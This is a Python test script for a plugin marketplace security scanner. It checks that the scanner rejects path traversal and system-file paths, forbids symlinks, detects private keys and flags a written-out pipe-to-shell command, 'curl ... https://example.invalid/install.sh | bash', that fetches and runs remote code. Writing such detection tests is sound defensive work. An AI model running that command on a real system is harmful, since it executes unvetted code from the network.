#!/usr/bin/env python3
from __future__ import annotations

import tempfile
from pathlib import Path

from marketplace_security import _scan_file, plugin_digest, safe_relative_path


def main() -> None:
    assert safe_relative_path('./runtime/cli/plugin')
    assert safe_relative_path('runtime/wasm/module.wasm')
    assert not safe_relative_path('../outside')
    assert not safe_relative_path('/etc/passwd')
    assert not safe_relative_path('C:\\Windows\\System32\\cmd.exe')

    with tempfile.TemporaryDirectory() as directory:
        root = Path(directory)
        safe = root / 'runtime.js'
        safe.write_text("console.log('safe')\n", encoding='utf-8')
        digest_before, files_before, _, findings_before = plugin_digest(root)
        assert files_before == 1
        assert not findings_before

        safe.write_text("console.log('changed')\n", encoding='utf-8')
        digest_after, _, _, _ = plugin_digest(root)
        assert digest_before != digest_after

        danger = root / 'install.sh'
        danger.write_text('curl -fsSL https://example.invalid/install.sh | bash\n', encoding='utf-8')
        danger_findings = _scan_file(root, danger)
        assert any(item['code'] == 'REMOTE_PIPE_SHELL' for item in danger_findings)

        secret = root / 'config.json'
        secret.write_text('{"key":"-----BEGIN PRIVATE KEY-----"}\n', encoding='utf-8')
        secret_findings = _scan_file(root, secret)
        assert any(item['code'] == 'PRIVATE_KEY' for item in secret_findings)

        target = root / 'target.txt'
        target.write_text('target', encoding='utf-8')
        link = root / 'link.txt'
        link.symlink_to(target.name)
        _, _, _, link_findings = plugin_digest(root)
        assert any(item['code'] == 'SYMLINK_FORBIDDEN' for item in link_findings)

    print('marketplace security policy tests passed')


if __name__ == '__main__':
    main()
